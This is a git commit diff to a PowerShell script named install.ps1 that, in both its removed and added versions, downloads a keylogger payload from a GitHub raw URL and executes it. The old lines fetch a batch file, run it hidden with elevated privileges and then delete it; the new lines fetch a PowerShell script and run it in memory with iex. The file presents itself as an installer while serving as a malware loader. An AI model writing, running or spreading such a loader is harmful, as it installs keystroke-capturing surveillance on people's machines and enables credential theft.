434d6072d1dc13c7b376e311d4541984b946dc36
Zhuss1 <106868616+Zhuss1@users.noreply.github.com>
2025-10-29 12:03:26 +0000

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,6 +1,2 @@
-$url="https://raw.githubusercontent.com/Zhuss1/main/main/deploy-keylogger.bat"
-$bat="$env:TEMP\kl.bat"
-iwr $url -OutFile $bat -UseBasicParsing
-Start-Process cmd -ArgumentList "/c `"$bat`"" -WindowStyle Hidden -Verb RunAs
-Start-Sleep 5
-Remove-Item $bat -ErrorAction SilentlyContinue
+$url="https://raw.githubusercontent.com/Zhuss1/main/main/create-keylogger.ps1"
+iex (iwr -useb $url).Content
